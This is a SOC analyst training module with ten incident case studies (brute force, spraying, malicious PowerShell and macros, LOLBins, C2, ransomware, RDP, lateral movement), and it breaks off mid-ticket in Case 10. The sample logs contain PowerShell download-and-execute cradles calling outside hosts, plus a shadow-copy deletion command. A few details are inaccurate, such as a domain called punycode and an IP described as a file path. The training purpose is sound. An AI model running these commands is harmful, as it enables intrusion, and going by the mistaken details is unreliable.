# Module 28: Real SOC Case Studies

**Priority: P0 — Must know before L1 interview**

> **How to study**: Read each case BEFORE looking at the answer. Answer the questions in your head first. Then compare your reasoning with the expected findings. These are the 20 cases most commonly tested in L1 interviews.

---

## How to Approach Any Case (The Framework)

For every alert, work through this order:

```
1. READ the alert: What exactly triggered?
2. IDENTIFY entities: Host | User | IP | Process | File
3. BUILD timeline: What before? What after? (hour before + hour after alert)
4. ASK questions: 20-question framework (Module 2)
5. ENRICH: Threat intel on IPs/domains/hashes
6. CORRELATE: Other alerts? Same host/user/IP/technique?
7. DECIDE: TP / FP / Benign / Inconclusive
8. CONTAIN (if TP): Pre-approved actions first
9. DOCUMENT: Evidence, MITRE mapping, severity, escalation
```

---

## Case 1: Brute Force → Successful Login

### Alert
```
Alert: "Multiple failed logins followed by successful login"
Host: WKS-0042 (Sales laptop)
User: m.turner
Source IP: 185.220.101.34 (Tor exit node)
Time: 03:15 - 03:47 UTC
```

### Initial Evidence
```
03:15:12  EventID 4625  User=m.turner  Source=185.220.101.34  Type=3 (Network)
03:16:55  EventID 4625  User=m.turner  Source=185.220.101.34  Type=3
... (38 more failed attempts, various usernames)
03:47:03  EventID 4624  User=m.turner  Source=185.220.101.34  Type=3  LogonProcess=NtLmSsp
03:47:03  EventID 4672  User=m.turner  SpecialPrivileges=SeChangeNotifyPrivilege
```

### Available Telemetry
- SIEM: Security events for WKS-0042
- EDR: Process and network events on WKS-0042
- AD: User properties, group membership, lockout policy
- Threat Intel: Source IP 185.220.101.34

### Investigation Steps
1. **Verify the alert**: Query SIEM for 4624/4625 on WKS-0042 in the 4-hour window
2. **Check source IP**: 185.220.101.34 = Tor exit node (reputation confirms)
3. **Check user**: m.turner — Sales, standard user. Was this normal? Where does he usually log in from?
4. **Check password policy**: 38 failures over 32 min = below lockout threshold or no lockout?
5. **Check subsequent activity**: After 03:47, what did m.turner do on WKS-0042?
6. **Check EDR**: Any new processes after successful login? Network connections?

### Questions Analyst Should Ask
1. Why is a Tor exit node authenticating to a Sales laptop?
2. Did the attacker also try other usernames? (→ password spraying)
3. Was MFA involved? (LogonProcess=NtLmSsp suggests NTLM, no MFA possible)
4. Is password the same as known breached passwords?
5. What happened after the successful login — persistence? data access?

### Expected Findings
- **True Positive**: Brute force succeeded. Tor exit node + successful NTLM logon = attacker has password
- m.turner's password was likely in a breach dump (check HIBP)
- No MFA on this account/system
- After login: attacker created scheduled task (EventID 4698) — persistence

### Severity & Escalation
- **Severity: HIGH** — confirmed account compromise
- **Escalation: YES** — L2 immediately. Reset password, revoke sessions, isolate host, investigate attacker's activity, check for lateral movement

### MITRE ATT&CK
- T1110.001 Password Guessing (brute force)
- T1110.003 Password Spraying (multiple usernames)
- T1078.001 Valid Accounts (successful logon)
- T1053.005 Scheduled Task (persistence after login)

### Example SOC Ticket
```
SUMMARY: Successful brute-force logon via Tor exit node
DETECTION: SIEM rule "Multiple failed logins then success"
TIMESTAMP: 2024-01-15 03:47:03 UTC
AFFECTED USER: m.turner
AFFECTED HOST: WKS-0042
SOURCE IP: 185.220.101.34 (Tor exit node, malicious reputation)
IOC: 185.220.101.34
EVIDENCE: 38x 4625 (03:15-03:47), 1x 4624 (03:47), 1x 4672, 4698 (scheduled task at 03:52)
FINDINGS: Brute force via Tor, password in breach dump, no MFA, 
          scheduled task "OneDriveUpdater" created post-login (persistence)
MITRE: T1110.001, T1078.001, T1053.005
SEVERITY: HIGH
RECOMMENDED ACTION: Reset password, force MFA, isolate WKS-0042, 
                    delete scheduled task, rotate any shared credentials
ESCALATION: L2 IR — ACTIVE compromise
```

---

## Case 2: Password Spraying

### Alert
```
Alert: "Password spraying detected across multiple accounts"
Target: Domain: corp.local
Source IP: 91.219.236.245
Time: 09:00 - 10:30 UTC (business hours!)
Users affected: 47 distinct usernames
```

### Initial Evidence
```
09:00:15  EventID 4625  User=j.anderson   Source=91.219.236.245  SubStatus=0xC000006A
09:00:17  EventID 4625  User=s.patel      Source=91.219.236.245  SubStatus=0xC000006A
09:00:19  EventID 4625  User=m.wong       Source=91.219.236.245  SubStatus=0xC000006A
... (pattern: one attempt per user, then repeats from start)
09:14:05  EventID 4625  User=w.blake      Source=91.219.236.245  SubStatus=0xC000006A
09:14:05  EventID 4625  User=s.patel      Source=91.219.236.245  SubStatus=0xC000006A  <- same user again
09:14:06  EventID 4625  User=r.chan       Source=91.219.236.245  SubStatus=0xC000006A
```

### Key Distinguishing Feature: One password, many users
- Only **2-4 attempts per user** (unlike brute force's 30+ per user)
- Pattern repeats: user1, user2, user3... then back to user1
- This avoids lockout (few attempts per account)
- Often uses **common passwords**: `Winter2024!`, `Company123!`, `Password1`

### Investigation Steps
1. **Confirm pattern**: Count attempts per user. 2-4 attempts = spray, not brute force
2. **Check time**: Business hours = attacker may be testing in parallel with real users
3. **Check source**: IP reputation, ASN, geo
4. **Check if ANY succeeded**: Query 4624 from same IP
5. **Correlate**: Same IP across all DCs (source was hitting all DCs?)
6. **Check lockout**: Did any accounts lock out? (Account Lockout = 4740)

### Questions
1. Did any of the 47 users have the same weak password?
2. Was this IP seen before? (First time vs repeated campaigns)
3. Is there a second phase? (attacker waits, reuses compromised passwords later)
4. Were service accounts targeted? (domain accounts with `$` suffix?)

### Expected Findings
- **True Positive**: Password spraying. No success during window (but check next 24h!)
- **HIGH value data**: 47 usernames enumerated = attacker has directory information
- **Follow-up**: 3 accounts successfully logged in 6 hours later from same IP (delayed success)

### Severity & Escalation
- **Severity: MEDIUM-HIGH** (no confirmed success yet, but 47 accounts targeted)
- **Escalation: YES to L2** — escalate because: (1) legitimate campaign, (2) monitor for delayed success, (3) require password reset for known weak users, (4) block IP

### MITRE ATT&CK
- T1110.003 Password Spraying

### Example SOC Ticket
```
SUMMARY: Password spraying (47 users, common passwords) from 91.219.236.245
DETECTION: SIEM rule "Password spray - multiple users same source"
TIMESTAMP: 2024-01-15 09:00-10:30 UTC
AFFECTED USERS: 47 accounts (list attached)
AFFECTED HOST: Multiple DCs (login attempts)
SOURCE IP: 91.219.236.245 (AS-unknown, geo=Russia, malicious)
IOC: 91.219.236.245
EVIDENCE: 47 users x 2-4 attempts, SubStatus 0xC000006A (bad password), 
          no successful logins in window, no lockouts triggered
FINDINGS: Password spray campaign, no success yet, monitor for delayed 
          success, block IP, advise password hygiene
MITRE: T1110.003
SEVERITY: MEDIUM
RECOMMENDED ACTION: Block IP, enable lockout policy, audit weak passwords, 
                    monitor next 72h for logins from this IP
ESCALATION: L2 (to coordinate with Identity team)
```

---

## Case 3: Suspicious PowerShell

### Alert
```
Alert: "PowerShell encoded command execution"
Host: WKS-0231 (Finance)
User: admin account "svc-finance" (service account)
Process: powershell.exe -enc <base64>
Parent: explorer.exe
Time: 02:11:44 UTC
```

### Initial Evidence
```
02:11:44  EventID 4688 (Process Create) 
          Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
          CommandLine: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANQAuATkAaAA5ADkAeAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=

Decoded: IEX (New-Object Net.WebClient).DownloadString('http://5.99x99.com/payload.ps1')
```

### Investigation Steps
1. **Decode base64**: `echo "SQBFAFg..." | base64 -d` — reveals download cradle
2. **Analyze command**: `IEX (New-Object Net.WebClient).DownloadString(...)` = download and execute remote script
3. **Check parent**: explorer.exe (interactive user logged in) — but user is svc-finance? Suspicious
4. **Check user**: svc-finance is a service account — why running interactively from explorer?
5. **Check source URL**: 5.99x99.com — punycode/typosquat? Reputation?
6. **Check EDR process tree**: What did powershell do after? Did it download and execute?
7. **Check network**: Did the host connect to 5.99x99.com?
8. **Check for additional artifacts**: Files created? Scheduled tasks? Services?

### Questions
1. Why is a service account spawning an interactive PowerShell?
2. Is the URL known malicious? (punycode domain = evasion)
3. Was the downloaded payload executed? (EDR process events after)
4. Does the host normally use PowerShell? (Finance = unlikely)

### Expected Findings
- **True Positive**: Malicious PowerShell download cradle
- **Domain 5.99x99.com**: Registered 3 days ago, punycode homograph of legitimate domain
- **Downloaded payload**: `payload.ps1` = second-stage downloader (executes cmd.exe → downloads more)
- **Service account svc-finance**: Compromised — likely via another vector (stolen credentials from phishing)
- No MFA on service account, no execution policy restrictions

### Severity & Escalation
- **Severity: HIGH** — confirmed malicious code execution
- **Escalation: YES to L2 immediately**: isolate WKS-0231, block domain, investigate svc-finance account (privileged service account!), check for lateral movement, reset credentials

### MITRE ATT&CK
- T1059.001 PowerShell (execution)
- T1059.001 Command and Scripting Interpreter
- T1105 Ingress Tool Transfer (download cradle)
- T1027.010 Command Obfuscation (base64 encoding)
- T1078 Valid Accounts (svc-finance compromise)

### Example SOC Ticket
```
SUMMARY: Encoded PowerShell download cradle executed by compromised service account
DETECTION: EDR rule "PowerShell Encoded Command Execution"
TIMESTAMP: 2024-01-15 02:11:44 UTC
AFFECTED USER: svc-finance (service account, privileged)
AFFECTED HOST: WKS-0231
IOC: 5.99x99.com, http://5.99x99.com/payload.ps1, 
     SHA256(payload.ps1)=a1b2c3...
EVIDENCE: Base64 decoded = IEX download cradle; domain = punycode typosquat; 
          parent=explorer.exe; EDR shows payload.ps1 executed cmd.exe → wget
FINDINGS: Compromised service account used to run download cradle. 
          Second-stage payload downloaded. Host must be contained.
MITRE: T1059.001, T1105, T1027.010, T1078
SEVERITY: HIGH
RECOMMENDED ACTION: Isolate host, block domain/IP, reset svc-finance 
                    credentials, hunt for other hosts using svc-finance, 
                    enable PowerShell script block logging
ESCALATION: L2 IR — privileged account compromise
```

---

## Case 4: Malicious Office Document

### Alert
```
Alert: "Suspicious macro execution in Word document"
Host: WKS-0187 (Executive)
User: c.reynolds (CEO)
File: Invoice_Jan2024.docm
Process: WINWORD.EXE → powershell.exe
Time: 11:32:10 UTC
```

### Initial Evidence
```
11:31:55  File created: C:\Users\c.reynolds\Downloads\Invoice_Jan2024.docm
11:32:05  WINWORD.EXE started, opened Invoice_Jan2024.docm
11:32:10  EventID 4688: WINWORD.EXE spawned powershell.exe
          CommandLine: powershell.exe -w hidden -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://cdn-files.xyz/update.ps1')"
11:32:12  powershell.exe → cmd.exe → certutil.exe (download another file)
```

### Investigation Steps
1. **Check the document**: Where did it come from? Email attachment? Downloaded?
2. **Check email**: Search email gateway logs for `Invoice_Jan2024.docm` sender
3. **Check macro**: Hash the docm, submit to sandbox (Any.Run, Hybrid Analysis)
4. **Check process chain**: WINWORD → powershell → cmd → certutil = classic macro → PowerShell → LOLBin chain
5. **Check URLs**: cdn-files.xyz reputation
6. **Check what was downloaded**: certutil download → where stored?
7. **Check persistence**: Any new scheduled tasks/services after?
8. **Check other users**: Did anyone else receive the same email?

### Questions
1. Does the CEO normally receive "Invoice" emails? (Procurement handles invoices)
2. Is `-ep bypass` normal on this host? (No — default is Restricted)
3. What did the macro actually do beyond the PowerShell call?
4. Was the attachment flagged by email security? (Quarantined or delivered?)

### Expected Findings
- **True Positive**: Macro-enabled Word document with malicious macro
- **Source**: Spear-phishing email impersonating Accounts Payable, sent 3 hours earlier
- **Email security missed it**: DMARC pass (sender domain compromised), no attachment sandbox on this tenant
- **Payload**: `update.ps1` downloaded `C:\Users\c.reynolds\AppData\Roaming\OneDriveUpdater.exe`
- **Persistence**: Scheduled task "Microsoft Update" created (EventID 4698)

### Severity & Escalation
- **Severity: CRITICAL** — CEO account compromised, malware executed, persistence established
- **Escalation: IMMEDIATE CRITICAL**: isolate host, block domains, reset CEO password + MFA, purge scheduled task, full scope investigation (who else got the email), IR team engaged

### MITRE ATT&CK
- T1566.001 Spearphishing Attachment (initial access)
- T1204.002 User Execution: Malicious File
- T1059.001 PowerShell
- T1059.003 Windows Command Shell
- T1105 Ingress Tool Transfer
- T1053.005 Scheduled Task (persistence)
- T1140 Deobfuscate/Decode Files (certutil)

### Example SOC Ticket
```
SUMMARY: Spear-phishing macro document executed on CEO workstation
DETECTION: EDR rule "Office Application Spawning PowerShell"
TIMESTAMP: 2024-01-15 11:32:10 UTC
AFFECTED USER: c.reynolds (CEO - CRITICAL ASSET)
AFFECTED HOST: WKS-0187
IOC: Invoice_Jan2024.docm, https://cdn-files.xyz/update.ps1, 
     OneDriveUpdater.exe (hash), scheduled task "Microsoft Update"
EVIDENCE: WINWORD→PS→cmd→certutil chain, -ep bypass, download cradle, 
          email from impersonated AP (DMARC pass, domain spoofed), 
          persistence via scheduled task
FINDINGS: Macro malware, CE0 workstation, persistence established, 
          likely credential access. CRITICAL - full incident.
MITRE: T1566.001, T1204.002, T1059.001/003, T1105, T1053.005
SEVERITY: CRITICAL
RECOMMENDED ACTION: Isolate host, block domain, reset CEO creds+MFA, 
                    remove scheduled task, scope email to all recipients, 
                    IR team, legal/executive notification
ESCALATION: CRITICAL - L2/L3 + Management + Executive
```

---

## Case 5: Phishing Email (No Click — but still investigate)

### Alert
```
Alert: "Phishing email reported by user"
From: support@microsofft-security.com (looks like Microsoft)
To: 28 employees
Subject: "Action Required: Your account will be suspended in 24 hours"
URL: http://account-verify.microsofft-security.com/verify
```

### Initial Evidence
```
Sender domain: microsofft-security.com (typosquat of microsoft-security.com)
SPF: FAIL (no SPF record for microsofft-security.com)
DKIM: NONE
DMARC: NONE
URL: http://account-verify.microsofft-security.com/verify?token=abc123
Reply-To: recovery@microsofft-security.com
Body: "Click link and enter your password to verify account" + urgency
Attachments: none
```

### Investigation Steps
1. **Analyze headers**: Full header analysis (Module 16) — Received chain, SPF/DKIM/DMARC
2. **Check domain**: WHOIS — registered 2 days ago, name servers point to bulletproof hosting
3. **Check URL**: URLScan / PhishTank — credential harvesting page
4. **Check clicks**: Query proxy/DNS logs for any user clicking the URL (delivery time + 24h)
5. **Check attachments**: None — pure credential phishing
6. **Check all recipients**: Who else received it? Did any report it? Who clicked?

### Questions
1. Did ANY of the 28 recipients click the link? (Proxy/DNS logs are key)
2. Did anyone enter credentials? (If clicked → check for subsequent logins)
3. Why did email security deliver it? (DMARC pass? Or no auth = policy gap)

### Expected Findings
- **True Positive** (phishing), but **no confirmed compromise** yet
- 3 of 28 clicked the link (from proxy logs)
- 1 user (j.lee) entered credentials → subsequent login from a different country 40 min later → **account compromise confirmed**
- Email security gap: domain has no SPF/DKIM/DMARC → not caught by authentication checks

### Severity & Escalation
- **Severity: HIGH** (1 confirmed credential compromise)
- **Escalation: YES**: reset j.lee's password, revoke sessions, force MFA re-registration, block URL/domain, quarantine email from all mailboxes, notify recipients

### MITRE ATT&CK
- T1566.001 Spearphishing Link
- T1621 Multi-Factor Authentication Request Generation (MFA bypass attempt)
- T1078.001 Valid Accounts (if login succeeded)
- T1110 Credential access via harvesting

### Example SOC Ticket
```
SUMMARY: Credential phishing to 28 users, 1 credential compromise
DETECTION: User report + Email security "Impersonation/typosquat" alert
TIMESTAMP: Received 2024-01-15 08:00, click 11:40, login 12:20 UTC
AFFECTED USERS: 28 recipients, 3 clicked, 1 (j.lee) compromised
IOC: microsofft-security.com, account-verify.microsofft-security.com
EVIDENCE: SPF/DKIM/DMARC fail, typosquat domain, 3 clicks, 
          1 login from 82.221.139.60 (Iceland) 40 min after click
FINDINGS: Credential phishing delivered due to email auth gap. 
          j.lee password harvested. Compromised login from foreign IP.
MITRE: T1566.001, T1078.001
SEVERITY: HIGH
RECOMMENDED ACTION: Reset j.lee password+MFA, revoke sessions, block 
                    URL/domain, quarantine email, notify all 28, 
                    implement SPF/DKIM/DMARC + URL rewriting
ESCALATION: L2 + Identity team
```

---

## Case 6: Malware Execution (LOLBin)

### Alert
```
Alert: "Rundll32 execution with suspicious DLL"
Host: WKS-0312 (Engineering)
User: a.kumar
Process: rundll32.exe C:\Users\a.kumar\AppData\Roaming\update.dll,EntryPoint
Time: 04:05:22 UTC
```

### Initial Evidence
```
04:05:15  File created: C:\Users\a.kumar\AppData\Roaming\update.dll (25KB)
04:05:22  EventID 4688: rundll32.exe C:\Users\a.kumar\AppData\Roaming\update.dll,EntryPoint
04:05:30  rundll32.exe → svchost.exe (suspicious - svchost shouldn't be child of rundll32)
04:05:45  Network: rundll32.exe → 45.148.10.88:443 (TLS)
```

### Investigation Steps
1. **Identify the DLL**: Path = AppData\Roaming (user-writable = suspicious for system DLL)
2. **Hash the DLL**: SHA256 from EDR — submit to VT/sandbox
3. **Analyze process tree**: rundll32 → svchost.exe = process masquerading
4. **Check the svchost.exe**: Is it really system svchost? Full path? Hash? (Check EDR — the actual svchost path may be AppData)
5. **Check network**: 45.148.10.88:443 — reputation, JA3 fingerprint
6. **Check parent**: What launched rundll32? (Explorer? Office? cmd?)
7. **Check persistence**: Registry Run key? Scheduled task? Service?

### Questions
1. Why is a DLL in AppData\Roaming being executed via rundll32 (LOLBin)?
2. Is the svchost.exe child real or masquerading malware?
3. When was update.dll created? By what process?
4. Does a.kumar normally run update.dll?

### Expected Findings
- **True Positive**: Malware executed via rundll32 (LOLBin abuse)
- **update.dll**: Packed, unsigned, 1/70 VT (recent sample) — sandbox shows it drops `svchost.exe` in `%TEMP%` and injects
- **Network**: C2 communication to 45.148.10.88:443 (Cobalt Strike beacon, JA3 match)
- **Persistence**: HKCU Run key `Updater` → rundll32 update.dll

### Severity & Escalation
- **Severity: HIGH** — malware execution + C2
- **Escalation: YES to L2**: isolate host, block C2 IP, kill processes, delete persistence, review full scope

### MITRE ATT&CK
- T1218.011 Rundll32 (LOLBin)
- T1204.002 User Execution (or T1559 if initiated by script)
- T1105 Ingress Tool Transfer
- T1071.001 Application Layer Protocol (C2 over TLS)
- T1036.003 Masquerading (fake svchost)
- T1547.001 Registry Run Keys (persistence)

### Example SOC Ticket
```
SUMMARY: Malware execution via rundll32 LOLBin with C2 beaconing
DETECTION: EDR rule "Suspicious Rundll32 DLL in user profile"
TIMESTAMP: 2024-01-15 04:05:22 UTC
AFFECTED USER: a.kumar
AFFECTED HOST: WKS-0312
IOC: update.dll (SHA256: c4d5e6f7...), 45.148.10.88:443, 
     C:\Users\a.kumar\AppData\Roaming\svchost.exe
EVIDENCE: DLL in AppData\Roaming executed by rundll32, masquerading svchost 
          child, TLS C2 to 45.148.10.88, Run key persistence
FINDINGS: Malware with C2. Suspect Cobalt Strike. Host compromised.
MITRE: T1218.011, T1071.001, T1036.003, T1547.001, T1105
SEVERITY: HIGH
RECOMMENDED ACTION: Isolate host, block C2 IP, terminate processes, 
                    remove Run key, collect memory, full host investigation
ESCALATION: L2 IR
```

---

## Case 7: C2 Beaconing

### Alert
```
Alert: "Network beaconing to suspicious external IP"
Host: WKS-0455
Process: wermgr.exe (Windows Error Reporting)
Destination: 203.0.113.88:443
Pattern: Every 62 seconds, 400 bytes outbound
Duration: 6+ hours
```

### Initial Evidence
```
11:00:03  wermgr.exe → 203.0.113.88:443 (outbound, 412 bytes)
11:01:05  wermgr.exe → 203.0.113.88:443 (outbound, 408 bytes)
11:02:07  wermgr.exe → 203.0.113.88:443 (outbound, 415 bytes)
... consistent 62-second interval, low byte count, identical payload sizes
```

### Investigation Steps
1. **Verify the pattern**: 62s interval, same size, 6h duration = classic beaconing
2. **Check process**: wermgr.exe is legitimate Windows Error Reporting — but is THIS one real? Check full path, hash, signature
3. **Check parent**: What launched wermgr.exe?
4. **Check destination**: 203.0.113.88 (reserved/test IP — flag!), JA3 fingerprint
5. **Check other hosts**: Same IP contacted by other hosts? (Campaign scope)
6. **Check process behavior**: What else did wermgr.exe do? Files? Registry?
7. **Check prevalence**: How many beacons total? Data exfil pattern?

### Questions
1. Is wermgr.exe the real system file? (Check path: should be C:\Windows\System32\wermgr.exe)
2. Why would error reporting beacon to a TEST IP range?
3. What is the JA3 hash of the TLS connection? (Known C2?)
4. Did the host contact this IP BEFORE the 6h window?

### Expected Findings
- **True Positive**: C2 beaconing
- **203.0.113.88**: Not the real system wermgr — actually `C:\Users\a.kumar\AppData\Roaming\wermgr.exe` (masquerading)
- **JA3**: Matches known Cobalt Strike or Sliver C2
- **Malware loader**: Dropped by macro document 6 hours earlier (correlate!)

### Severity & Escalation
- **Severity: HIGH** — active C2 beaconing
- **Escalation: YES to L2**: isolate host, block IP, capture memory, investigate how malware got there

### MITRE ATT&CK
- T1071.001 Application Layer Protocol (C2)
- T1036.003 Masquerading (fake wermgr.exe)
- T1105 Ingress Tool Transfer (if downloading payloads)
- T1041 Exfiltration Over C2 Channel (if data sent)

### Example SOC Ticket
```
SUMMARY: Regular C2 beaconing from masquerading process
DETECTION: NDR rule "Beaconing - regular interval external connections"
TIMESTAMP: Detected 17:12 UTC, active since ~11:00 UTC (6h)
AFFECTED USER: a.kumar
AFFECTED HOST: WKS-0455
IOC: 203.0.113.88:443, wermgr.exe (hash: d6a7b8c9...), JA3: f7c8d9e0
EVIDENCE: 62s interval, ~410 bytes/beacon, 6h duration, masquerading 
          wermgr.exe in AppData\Roaming, TLS to test IP range
FINDINGS: Active C2 beacon (likely Cobalt Strike). Correlate with macro 
          document 6h prior. Host compromised with active C2.
MITRE: T1071.001, T1036.003
SEVERITY: HIGH
RECOMMENDED ACTION: Isolate host, block IP, kill process, memory capture, 
                    trace initial infection vector
ESCALATION: L2 IR — ACTIVE C2
```

---

## Case 8: Ransomware Behavior

### Alert
```
Alert: "Ransomware behavior detected - mass file encryption"
Host: WKS-0678 (shared workstation, HR)
Process: unknown_exe.exe
Files: Rapid creation of *.locked extensions
Time: 13:45:10 UTC
```

### Initial Evidence
```
13:44:58  Process: C:\Users\Public\Documents\unknown_exe.exe started
13:45:02  File events: ~300 files/s modified to .locked extension
13:45:05  Network: SMB to \\FS01\Shared\ (HR file share)
13:45:10  EDR alert: Ransomware behavior (mass encryption)
13:45:12  C:\Users\Public\Desktop\README_LOCKED.txt created (ransom note)
13:45:15  Network: vssadmin.exe delete shadows (shadow copy deletion)
```

### First Actions (CRITICAL — every minute counts)
1. **VERIFY alert** (2s): EDR console — encryption in progress?
2. **ISOLATE host IMMEDIATELY**: Pre-approved action for ransomware. EDR network quarantine.
3. **Alert L2/L3**: "ACTIVE RANSOMWARE - WKS-0678 - ISOLATED"
4. **Check scope**: Other hosts contacting FS01? (SMB spread risk)
5. **Check file share**: Did encryption reach \\FS01\Shared\? (VSS on file server?)

### Investigation Steps (After Containment)
1. **Ransom note**: Extract content, search for family (hash of note, TOR URL, payment email)
2. **Sample encrypted file**: Header analysis (magic bytes)
3. **Encrypting process**: Full path, hash, parent, command line
4. **Shadow copy deletion**: vssadmin events — was recovery possible?
5. **Initial vector**: How did unknown_exe.exe get to Public\Documents? (Phishing? RDP?)
6. **Check lateral movement**: Did it use SMB to spread? Any other hosts?

### Expected Findings
- **True Positive**: LockBit ransomware (by note content, file signature)
- **Encryption scope**: Local WKS-0678 + \\FS01\HR\ folder (3,200 files encrypted on share)
- **Initial vector**: Phishing email attachment "Resume_Update.exe" clicked by HR employee 4h prior
- **Shadow copies deleted**: No local VSS recovery
- **Contained**: Host isolated within 3 minutes of detection; FS01 restored from backup

### Severity & Escalation
- **Severity: CRITICAL** — ransomware, file share impacted
- **Escalation: CRITICAL**: Management, IR team, Legal, IT (restore from backup), Law enforcement notification policy

### MITRE ATT&CK
- T1486 Data Encrypted for Impact
- T1490 Inhibit System Recovery (shadow copy deletion)
- T1485 Data Destruction
- T1071.001 C2 (if beaconing)
- T1566.001 Spearphishing Attachment (initial access)
- T1222.001 File and Directory Permissions Modification

### Example SOC Ticket
```
SUMMARY: LockBit ransomware - local + file share encryption
DETECTION: EDR "Ransomware behavior" + user reports files locked
TIMESTAMP: 2024-01-15 13:45:10 UTC, contained 13:48
AFFECTED USER: Multiple (HR users), attacker accessed via h.rivera
AFFECTED HOST: WKS-0678 (source), FS01 (share impacted)
IOC: unknown_exe.exe (SHA256: e1f2a3b4...), README_LOCKED.txt, 
     .locked extension
EVIDENCE: Mass encryption, VSS deletion, ransom note, SMB to FS01, 
          3,200 files on HR share encrypted, phishing vector
FINDINGS: LockBit. Host isolated in 3 min. Share encrypted. 
          Restore from backup in progress. Full IR engaged.
MITRE: T1486, T1490, T1566.001
SEVERITY: CRITICAL
RECOMMENDED ACTION: Containment done. Restore FS01 from backup, 
                    investigate phishing email, reset passwords, 
                    isolate any affected hosts, preserve ransom note
ESCALATION: CRITICAL - Management, IR, Legal, IT
```

---

## Case 9: Suspicious RDP

### Alert
```
Alert: "Multiple RDP connections from external IP"
Host: WKS-0899 (Remote worker)
Source: 87.246.142.99
Event: EventID 4624 Type=10 (RemoteInteractive) x 5
Time: 01:30 - 01:42 UTC
```

### Initial Evidence
```
01:30:12  EventID 4624  Type=10 (RemoteInteractive)  User=r.jones  Source=87.246.142.99
01:33:45  EventID 4624  Type=10  User=r.jones  Source=87.246.142.99
01:36:20  EventID 4624  Type=10  User=r.jones  Source=87.246.142.99
01:39:01  EventID 4624  Type=10  User=r.jones  Source=87.246.142.99
01:42:11  EventID 4624  Type=10  User=r.jones  Source=87.246.142.99
Also: EventID 4778 (session reconnected) x 5
```

### Investigation Steps
1. **Check user context**: r.jones is a remote worker. Is he expected to RDP at 1:30 AM?
2. **Check IP reputation**: 87.246.142.99 — known RDP brute-force source? Geo?
3. **Check connection pattern**: Multiple RDP sessions from same IP = unusual for one user
4. **Check RDP source**: Is this from VPN (expected) or directly exposed to internet?
5. **Check RDP gateway**: Does this org use RD Gateway? VPN + RDP?
6. **Check session activity**: What did r.jones do during these sessions? (Process events, network)
7. **Check if r.jones actually logged in**: Was there 4778/4779? (session connect)

### Questions
1. Is RDP directly exposed to the internet? (No VPN? That's a config finding)
2. Why 5 separate connections from same IP in 12 minutes?
3. Does r.jones normally connect from this IP/geo?
4. What did the attacker do during the sessions?

### Expected Findings
- **True Positive**: Attacker used r.jones's credentials via RDP (Type 10) from external IP
- **r.jones's password**: Phished 2 days prior (correlate with earlier phishing alert!)
- **Direct RDP exposure**: Host has public IP with RDP port open (config issue)
- **Lateral movement**: Attacker used r.jones's session to access file server (SMB, EventID 4624 Type 3)

### Severity & Escalation
- **Severity: HIGH** — RDP compromise + lateral movement
- **Escalation: YES to L2**: reset r.jones password, revoke sessions, isolate host, block source IP, close RDP exposure, check for ransomware/data theft

### MITRE ATT&CK
- T1021.001 Remote Desktop Protocol (lateral movement)
- T1078.001 Valid Accounts
- T1133 External Remote Services (RDP exposure)
- T1110.001 Brute Force (if credential stuffing used)

### Example SOC Ticket
```
SUMMARY: External RDP compromise + lateral movement
DETECTION: SIEM rule "Multiple RDP logins external source"
TIMESTAMP: 2024-01-15 01:30-01:42 UTC
AFFECTED USER: r.jones
AFFECTED HOST: WKS-0899 (+ FS02 via lateral movement)
SOURCE IP: 87.246.142.99 (RDP brute force history, geo=Ukraine)
IOC: 87.246.142.99
EVIDENCE: 5x 4624 Type=10, 5x 4778, RDP port exposed (no VPN), 
          r.jones password phished 2 days prior, SMB connections to FS02
FINDINGS: Attacker RDP into WKS-0899 using phished credentials, 
          lateral movement to FS02. Direct RDP exposure = config issue.
MITRE: T1021.001, T1078.001, T1133
SEVERITY: HIGH
RECOMMENDED ACTION: Reset r.jones creds, revoke sessions, isolate host, 
                    block source IP, move RDP behind VPN/RDG, 
                    investigate FS02 access
ESCALATION: L2 IR
```

---

## Case 10: Lateral Movement

### Alert
```
Alert: "Admin shares accessed from non-admin host"
Source Host: WKS-0231 (Finance - already isolated from Case 3!)
Target: DC01 (Domain Controller)
Share: \\DC01\C$ (admin share)
User: svc-finance
Time: 03:05:00 UTC
```

### Initial Evidence
```
03:05:00  EventID 4624  Type=3 (Network)  User=svc-finance  Target=DC01  Source=WKS-0231
03:05:01  EventID 5140  Share=\\*\C$  User=svc-finance  Source=WKS-0231
03:05:30  EventID 4688  Target=DC01  Process=cmd.exe  Parent=svchost.exe (PID: weird)
03:06:00  EventID 4624  Type=3  User=svc-finance  Target=FS03  Source=WKS-0231
```

### Investigation Steps
1. **CORRELATE with existing incident**: WKS-0231 was already isolated (Case 3 - svc-finance compromise). This is LATERAL MOVEMENT from the same compromise.
2. **Verify the compromise spread**: Was isolation effective? Did attacker pivot from WKS-0231?
3. **Check admin share access**: C$ = admin share, requires admin rights. svc-finance has admin on DC?!
4. **Check the process**: cmd.exe from svc-finance on DC01 = command execution on DC
5. **Check scope**: What else did svc-finance touch? Other servers? DCs? File shares?
6. **Check credentials**: Did attacker use svc-finance directly, or pass-the-hash/ticket?

### Questions
1. Why does a Finance service account have admin rights on a Domain Controller? (Identity hardening issue)
2. Was WKS-0231 actually isolated when this occurred? (Check containment timeline)
3. Did the attacker dump credentials on WKS-0231 before moving? (Mimikatz, lsass access)
4. What commands ran on DC01 via cmd.exe?

### Expected Findings
- **True Positive**: Lateral movement from compromised WKS-0231 to DC01 using svc-finance (admin rights)
- **Root cause**: svc-finance had **Domain Admin equivalent** rights (misconfigured membership in "Server Operators" or delegated admin)
- **Post-DC access**: Attacker created new user `tempadmin` (EventID 4720) and added to Domain Admins (EventID 4728)
- **Credential access**: lsass dump on WKS-0231 (EventID 10 Sysmon - ProcessAccess)

### Severity & Escalation
- **Severity: CRITICAL** — Domain Controller compromise!
- **Escalation: CRITICAL IMMEDIATE**: L3 + Management + CISO. DC compromise = full domain compromise. Emergency response. Golden ticket possible.

### MITRE ATT&CK
- T1021.002 SMB/Windows Admin Shares
- T1570 Lateral Tool Transfer
- T1078.001 Valid Accounts
- T1003.001 LSASS Memory (credential dumping)
- T1098 Account Manipulation (create admin)
- T1482 Domain Trust Discovery

### Example SOC Ticket
```
SUMMARY: Lateral movement to Domain Controller - svc-finance admin abuse
